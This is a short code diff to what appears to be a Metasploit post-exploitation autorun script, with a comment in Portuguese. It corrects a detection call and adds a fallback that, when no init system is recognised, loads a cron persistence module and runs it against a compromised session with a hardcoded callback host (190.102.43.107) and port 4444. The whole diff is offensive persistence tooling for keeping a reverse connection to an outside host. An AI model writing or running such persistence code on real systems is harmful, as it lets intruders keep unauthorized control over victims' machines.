@@ -15,7 +15,7 @@ print("\n")
 SessionSanitizer.run(fm, target_ip, sid)
 print("\n")
 
-init_type = InitDetector.detect(session)
+init_type = InitDetector.detect(client)  # ← aqui: 'client', não 'session'
 
 lhost = "190.102.43.107"
 lport = "4444"
@@ -34,5 +34,7 @@ if handler = init_handlers[init_type]
   print_status("#{type_name} was detected")
   handler.call
 else
-  print_error("Unsupported or unknown init system: #{init_type}")
+  print_status("No known init system detected. Falling back to cron persistence.")
+  require '/home/msf/msf-autorunscripts/cron_fallback_persistence'
+  CronFallbackPersistence.run(fm, sid, client, lhost, lport)
 end
